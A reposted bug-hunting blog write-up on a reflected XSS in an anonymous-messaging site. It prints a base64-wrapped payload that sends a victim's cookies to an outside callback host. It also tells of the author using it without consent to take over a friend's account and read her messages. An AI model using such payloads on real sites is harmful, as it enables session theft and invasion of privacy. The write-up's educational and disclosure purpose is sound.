# :globe_with_meridians: Reading My Crush Messages through XSS

> **Original Source:** [Reading My Crush Messages through XSS](https://infosecwriteups.com/reading-my-crush-messages-through-xss-f662661119c2)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Reading My Crush Messages through XSS


Greetings to all readers,


This is a belated post as this incident took place when I used to be in college last year.


So last year in lockdown there was a trend going on for anonymous messaging where people used to share links and their friends can message them anything they want anonymously.


This is very similar to Sarahah writeup, if anyone has read that writeup will find this quite similar.


So, one of my college friend shared a link on their whatsapp status for the same. The link pointed to the website quizprank.xyz


The link she shared was allowing others to message anything they want.


I opened the link and had a look and found interesting files and parameters.


Upon checking one interesting link I found was


[https://quizprank.xyz/error.php?error=WW91IHdlcmUgbG9nZ2VkIG91dCE=](https://quizprank.xyz/error.php?error=WW91IHdlcmUgbG9nZ2VkIG91dCE%3D)


So the error parameter was using base64 encoded text and directly reflects it on the page.


I used a simple XSS Payload and encoded it in base64.

>

Payload — “><script>alert(1);</script>


Base 64 Encoded- Ij48c2NyaXB0PmFsZXJ0KDEpOzwvc2NyaXB0Pg==


This resulted in executing the javascript payload and popup was observed.


Well, many of the Infosec people just stop at popping up an alert in XSS Vulnerability but in bug hunting, I have seen many cases where the program pays you way more if you show them a method that leads to account takeover.


So let’s come to exploitation.


## Get Shashwat Kumar’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


In this case, I used a simple method to steal the cookies.
I modified my payload to request a link to my server and send cookies in the same link.


*New payload- <script>document.location=’*[http://cdkhapj2vtc0000ng0w0gg3aimcyyyyyb.oast.fun?c='+btoa(document.cookie)](http://cdkhapj2vtc0000ng0w0gg3aimcyyyyyb.oast.fun/?c=%27+btoa%28document.cookie%29)* ;</script>*


Here, I used a free service interact.sh to receive and see the requests made through the payload.


I encoded the payload using Base64 and send it to her-


She clicked on the link and I received the cookies of her account along with the User-Agent and IP.


Now, the only thing I had to do was use those cookies and I could see all the messages she received.


I modified the cookies with the one I received in Burp Suite Repeater and I was able to access her account and could see all her messages.


This resulted in taking over her account on that website.


Well I told her about this as she should know what has happened xD


Well, she didn’t get angry about this, replied positively, and was interested to know how it was done.


Ps: Don’t try to impress using such methods as this seems creepy and never works in real life.


So this was a very simple way to exploit XSS vulnerability and it’s quite easy to find on websites like the above.


Also, the vulnerability was reported to the Admin last year.


Conclusion


Not to click and trust links you receive.


For Infosec People: Yes the HttpOnly flag was missing in the Cookies that led this to steal cookies.


The input sanitization was missing that allowed payloads to reflect on the page.

---

*Originally published on [Medium](https://infosecwriteups.com/reading-my-crush-messages-through-xss-f662661119c2). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
